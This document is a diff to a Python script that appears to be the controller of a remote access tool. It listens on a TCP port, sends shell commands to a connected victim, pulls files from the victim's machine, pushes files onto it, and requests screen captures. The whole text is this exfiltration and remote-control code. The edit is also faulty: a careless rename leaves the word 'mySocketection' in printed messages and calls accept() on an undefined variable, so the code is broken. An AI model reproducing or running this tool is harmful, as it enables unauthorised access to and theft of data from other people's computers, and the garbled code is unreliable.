@@ -8,9 +8,10 @@ import socket
 
 ip = "0.0.0.0"
 port = 8080
+chunksize = 1024
 
-def transfer(conn, command, operation):
-    conn.send(command.encode())
+def transfer(mySocket, command, operation):
+    mySocket.send(command.encode())
 
     # grab*C:\Users\user\Desktop\file.txt
     if (operation == "grab"):
@@ -22,7 +23,7 @@ def transfer(conn, command, operation):
         f=open('/root/Desktop/'+fileName, 'wb')
 
     while True:
-        bits = conn.recv(5000)
+        bits = mySocket.recv(chunksize)
         if bits.endswith('DONE'.encode()):
             f.write(bits[:-4]) # Write those last received bits without the word 'DONE'
             f.close()
@@ -34,45 +35,45 @@ def transfer(conn, command, operation):
             break
         f.write(bits)
 
-def doSend(conn, sourcePath, destinationPath, fileName):
+def doSend(mySocket, sourcePath, destinationPath, fileName):
     # For 'send' operation, open the file in the read mode
-    # Read the file into packets and send them through connection object
+    # Read the file into packets and send them through mySocket object
     # After finished sending the whole file, send string 'DONE' to indicate the completion
     if os.path.exists(sourcePath + fileName):
         sourceFile = open(sourcePath + fileName, 'rb')
-        packet = sourceFile.read(5000)
+        packet = sourceFile.read(chunksize)
         while len(packet) >0:
-            conn.send(packet)
-            packet = sourceFile.read(5000)
-        conn.send('DONE'.encode())
+            mySocket.send(packet)
+            packet = sourceFile.read(chunksize)
+        mySocket.send('DONE'.encode())
         print('[+] Transfer Completed')
     else:
-        conn.send('File not found'.encode())
+        mySocket.send('File not found'.encode())
         print('[-] Unable to find the file')
 
 def connect():
-    s = socket.socket()
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
-    s.bind((ip, port))
-    s.listen(1)
+    initSocket = socket.socket()
+    initSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+    initSocket.bind((ip, port))
+    initSocket.listen(1)
     print("=" * 60)
     print("TCP DATA INFILTRATION AND EXFILTRATION")
     print("=" * 60)
-    print('[+] Listening for income TCP connection on port', port)
-    conn, addr = s.accept()
-    print('[+] We got a connection from', addr)
+    print('[+] Listening for incoming TCP mySocketection on port', port)
+    mySocket, clientAddress = mySocket.accept()
+    print('[+] We got a mySocketection from', clientAddress)
 
     while True:
         print("=" * 60)
         command = input("Shell> ")
         if 'terminate' in command:
-            conn.send('terminate'.encode())
+            mySocket.send('terminate'.encode())
             break
 
         #command format: grab*<File Path>
         #example: grab*C:\Users\John\Desktop\photo.jpeg
         elif 'grab' in command:
-            transfer(conn, command, "grab")
+            transfer(mySocket, command, "grab")
 
         #command format: send*<destination path>*<File Name>
         #example: send*C:\Users\John\Desktop\*photo.jpeg
@@ -80,14 +81,14 @@ def connect():
         elif 'send' in command:
             sendCmd, destination, fileName = command.split("*")
             source = input("Source path: ")
-            conn.send(command.encode())
-            doSend(conn, source, destination, fileName)
+            mySocket.send(command.encode())
+            doSend(mySocket, source, destination, fileName)
         elif 'screencap' in command:
-            transfer(conn, command, "screenCap")
+            transfer(mySocket, command, "screenCap")
 
         else:
-            conn.send(command.encode())
-            print(conn.recv(5000).decode())
+            mySocket.send(command.encode())
+            print(mySocket.recv(chunksize).decode())
 
 def main():
     connect()
